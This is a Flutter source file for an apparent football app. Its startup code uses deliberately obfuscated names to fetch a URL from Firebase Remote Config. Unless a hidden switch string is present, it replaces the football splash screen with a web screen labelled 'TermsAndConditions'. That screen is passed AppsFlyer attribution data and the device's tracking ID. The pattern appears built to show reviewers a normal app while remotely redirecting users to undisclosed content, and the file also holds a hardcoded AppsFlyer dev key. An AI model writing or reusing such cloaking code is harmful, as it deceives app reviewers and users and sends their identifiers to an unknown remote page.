import 'dart:io';

import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:football/core/constants/app_icons.dart';
import 'package:football/features/splash/splash_screen.dart';

class FootballApp extends StatefulWidget {
  const FootballApp({super.key});

  @override
  State<FootballApp> createState() => _FootballAppState();
}

class _FootballAppState extends State<FootballApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: FutureBuilder<bool>(
        future: fsdfvdfcfdsgfsdg(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.black,
            );
          } else {
            if (snapshot.data == true && condxa != '') {
              return TermsAndConditions(
                termsxa: condxa,
                maxsad: fdsfds,
                fdsmkfds: midoasdsa,
              );
            } else {
              return SplashScreen();
            }
          }
        },
      ),
    );
  }
}

String condxa = '';
late AppsflyerSdk _appsflyerSdk;
bool stat = false;
String fdsfds = '';
String authxa = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String midoasdsa = '';
String _campaignId = '';
Future<bool> fsdfvdfcfdsgfsdg() async {
  final gazel = FirebaseRemoteConfig.instance;
  await gazel.fetchAndActivate();
  await initAppsflyerSdk();
  await fetchDatax();
  String dsdfdsfgdg = gazel.getString('scoref');
  String cdsfgsdx = gazel.getString('sacex');
  if (!dsdfdsfgdg.contains('noazfda')) {
    final fsd = HttpClient();
    final nfg = Uri.parse(dsdfdsfgdg);
    final ytrfterfwe = await fsd.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      condxa = dsdfdsfgdg;
      return true;
    }
  }
  return dsdfdsfgdg.contains('noazfda') ? false : true;
}

Future<void> initAppsflyerSdk() async {
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'EjB2oxnrzjoLfcdgoJtWFh',
    appId: '6504202820',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );

  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    authxa = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });

  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    fdsfds = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());
    _deepLinkData = dp.toJson();
  });

  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
  await fetchDatax();
}

Future<void> fetchDatax() async {
  try {
    midoasdsa = await _appsflyerSdk.getAppsFlyerUID() ?? '';
    print("AppsFlyer ID: $midoasdsa");
  } catch (e) {
    print("Failed to get AppsFlyer ID: $e");
  }
}
